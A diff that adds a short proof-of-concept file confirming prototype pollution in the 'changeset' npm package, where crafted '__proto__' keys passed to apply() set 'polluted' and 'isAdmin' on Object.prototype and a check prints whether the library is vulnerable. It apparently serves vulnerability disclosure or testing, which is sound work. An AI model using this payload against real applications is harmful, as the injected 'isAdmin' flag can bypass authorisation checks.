@@ -1,0 +1,33 @@
+Confirmed prototype pollution via `changeset.apply`.
+
+```javascript
+// Prototype Pollution in `changeset` package (index.js -> apply()).
+// The apply() function walks change.key arrays and blindly does
+// `ptr[prop] = value` / `ptr = ptr[prop]` without filtering dangerous
+// keys like "__proto__", allowing an attacker-controlled changeset
+// (e.g. one derived from untrusted diff/patch data) to pollute
+// Object.prototype for every object in the process.
+
+var changeset = require("changeset");
+
+// Malicious "changes" array, as could be produced/received from an
+// untrusted source and fed into changeset.apply().
+var maliciousChanges = [
+  { type: "put", key: ["__proto__", "polluted"], value: "yes" },
+  { type: "put", key: ["__proto__", "isAdmin"], value: true }
+];
+
+// Trigger the sink.
+changeset.apply(maliciousChanges, {}, true);
+
+// Every plain object in the process is now polluted.
+var victim = {};
+console.log("polluted:", victim.polluted); // "yes"
+console.log("isAdmin:", victim.isAdmin);   // true
+
+if (victim.polluted === "yes" && victim.isAdmin === true) {
+  console.log("VULNERABLE: Object.prototype was successfully polluted via changeset.apply()");
+} else {
+  console.log("Not vulnerable");
+}
+```
